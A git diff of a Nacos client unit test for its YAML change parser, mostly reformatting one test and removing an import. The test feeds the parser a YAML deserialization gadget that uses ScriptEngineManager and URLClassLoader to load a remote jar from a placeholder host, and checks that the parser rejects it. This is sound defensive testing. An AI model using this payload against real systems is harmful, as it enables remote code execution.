@@ -18,7 +18,6 @@ package com.alibaba.nacos.client.config.impl;
 
 import com.alibaba.nacos.api.config.ConfigChangeItem;
 import com.alibaba.nacos.api.exception.runtime.NacosRuntimeException;
-import com.alibaba.nacos.client.config.impl.YmlChangeParser;
 import org.junit.Assert;
 import org.junit.Test;
 
@@ -76,9 +75,10 @@ public class YmlChangeParserTest {
     
     @Test(expected = NacosRuntimeException.class)
     public void testChangeInvalidKey() {
-        parser.doParse("anykey:\n  a", "anykey: !!javax.script.ScriptEngineManager [\n"
-                + "  !!java.net.URLClassLoader [[\n"
-                + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]", type);
+        parser.doParse("anykey:\n  a",
+                "anykey: !!javax.script.ScriptEngineManager [\n" + "  !!java.net.URLClassLoader [[\n"
+                        + "    !!java.net.URL [\"http://[yourhost]:[port]/yaml-payload.jar\"]\n" + "  ]]\n" + "]",
+                type);
     }
 }
 
